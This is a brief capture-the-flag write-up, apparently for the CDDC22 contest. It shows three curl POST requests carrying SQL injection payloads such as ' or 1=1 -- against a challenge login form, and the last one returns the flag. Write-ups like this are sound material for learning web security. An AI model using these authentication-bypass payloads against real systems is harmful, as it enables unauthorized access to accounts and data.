# SQLogin

Seems like the usual SQL injection

## Try 1

```shell
curl -X "POST" "http://13.215.173.140:51130/" \
     -H 'Content-Type: application/x-www-form-urlencoded; charset=utf-8' \
     --data-urlencode "id=admin" \
     --data-urlencode "pw=' or 1=1 --"
```

![](i1.png)
Hrmm

## Try 2

```shell
curl -X "POST" "http://13.215.173.140:51130/" \
     -H 'Content-Type: application/x-www-form-urlencoded; charset=utf-8' \
     --data-urlencode "id=' or 1=1 --" \
     --data-urlencode "pw="
```

![](i2.png)

## Try 3

```shell
curl -X "POST" "http://13.215.173.140:51130/" \
     -H 'Content-Type: application/x-www-form-urlencoded; charset=utf-8' \
     --data-urlencode "id=' or 1 --" \
     --data-urlencode "pw="
```

![](i3.png)

```text
Login Success!
Flag is CDDC22{Th1s_i5_51mp1e_SQL_inj3ct10n}
```

erm, was this supposed to happen?